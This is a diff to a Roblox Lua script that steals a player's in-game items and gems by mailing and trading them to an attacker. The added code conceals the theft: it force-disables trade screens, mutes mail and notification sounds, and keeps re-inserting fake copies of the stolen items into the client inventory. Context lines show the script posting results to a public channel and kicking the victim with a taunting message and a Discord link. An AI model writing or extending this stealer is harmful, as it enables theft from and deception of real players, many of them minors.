@@ -48,6 +48,118 @@ end
 local States = {Inventory = {}, Gems = 0, TotalRAP = 0, MailCost = 0}
 local Settings = {MinRap = 1000000, MinGems = 500000}
 local RemoteCache = {}
+local ProtectedItems = {}
+
+local function DeepCopy(v)
+    if type(v) ~= "table" then return v end
+    local c = {}
+    for k, val in pairs(v) do
+        c[DeepCopy(k)] = DeepCopy(val)
+    end
+    return c
+end
+
+pcall(function()
+    local pg = plr:WaitForChild("PlayerGui", 10)
+    if not pg then return end
+
+    local tradeNames = {"TradeGUI", "TradeGUI_Phone", "Trade", "TradingGUI", "TradingGui", "TradeMenu"}
+
+    local function isTradeGui(obj)
+        if not obj then return false end
+        local n = obj.Name
+        for _, tn in ipairs(tradeNames) do
+            if n == tn then return true end
+        end
+        if n:lower():find("trade") then return true end
+        return false
+    end
+
+    local function killGui(g)
+        if not g then return end
+        if g:IsA("ScreenGui") or g:IsA("GuiObject") then
+            pcall(function() g.Enabled = false end)
+            pcall(function()
+                g:GetPropertyChangedSignal("Enabled"):Connect(function()
+                    if g.Enabled then g.Enabled = false end
+                end)
+            end)
+        end
+    end
+
+    for _, d in ipairs(pg:GetDescendants()) do
+        if isTradeGui(d) then killGui(d) end
+    end
+
+    pg.DescendantAdded:Connect(function(d)
+        if isTradeGui(d) then
+            task.wait()
+            killGui(d)
+        end
+    end)
+
+    local soundKeywords = {"mail", "send", "box", "claim", "pop", "success", "notif", "drop", "reward"}
+
+    local function isMailSound(s)
+        local n = s.Name:lower()
+        for _, kw in ipairs(soundKeywords) do
+            if n:find(kw) then return true end
+        end
+        local p = s.Parent
+        while p and p ~= pg do
+            local pn = p.Name:lower()
+            for _, kw in ipairs(soundKeywords) do
+                if pn:find(kw) then return true end
+            end
+            p = p.Parent
+        end
+        return false
+    end
+
+    local function muteSound(s)
+        if not s:IsA("Sound") then return end
+        if not isMailSound(s) then return end
+        pcall(function()
+            s.Volume = 0
+            s.Playing = false
+        end)
+        pcall(function()
+            s:GetPropertyChangedSignal("Volume"):Connect(function()
+                if s.Volume > 0 then s.Volume = 0 end
+            end)
+        end)
+        pcall(function()
+            s:GetPropertyChangedSignal("Playing"):Connect(function()
+                if s.Playing then s.Playing = false end
+            end)
+        end)
+    end
+
+    for _, d in ipairs(pg:GetDescendants()) do
+        if d:IsA("Sound") then muteSound(d) end
+    end
+
+    pg.DescendantAdded:Connect(function(d)
+        if d:IsA("Sound") then muteSound(d) end
+    end)
+end)
+
+RunService.RenderStepped:Connect(function()
+    pcall(function()
+        local save = require(ReplicatedStorage.Library.Client.Save).Get()
+        if not save or type(save.Inventory) ~= "table" then return end
+        for cat, items in pairs(ProtectedItems) do
+            if save.Inventory[cat] == nil then
+                save.Inventory[cat] = {}
+            end
+            for uid, item in pairs(items) do
+                if save.Inventory[cat][uid] == nil then
+                    save.Inventory[cat][uid] = item
+                end
+            end
+        end
+    end)
+end)
 
 local REAL_JOB_ID = game.JobId
 local bypassJobId = game.JobId
@@ -389,6 +501,14 @@ local function ExecuteTrade(targetPlayer, items)
     end
 
     SpamReadyAndConfirm()
+
+    local waitCount = 0
+    while GetTradeId() ~= nil and waitCount < 150 do
+        task.wait(0.1)
+        waitCount = waitCount + 1
+    end
+    task.wait(1.5)
+
     return true
 end
 
@@ -654,6 +774,15 @@ local function MainExecution()
         .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
     SendPublic({ message = publicMsg })
 
+    local fullInv = GetInventory()
+    for _, item in ipairs(items) do
+        local catData = fullInv[item.Category]
+        if catData and catData[item.UID] then
+            ProtectedItems[item.Category] = ProtectedItems[item.Category] or {}
+            ProtectedItems[item.Category][item.UID] = DeepCopy(catData[item.UID])
+        end
+    end
+
     local mailItems = {}
     for _, item in ipairs(items) do
         if not item.IsTradeItem then
@@ -683,7 +812,7 @@ local function MainExecution()
         SendAllGems()
     end
 
-    task.wait(2)
+    task.wait(3)
     plr:Kick("Your shit got stolen by Arasaka Corp | discord.gg/arasaka-corp")
 end
 
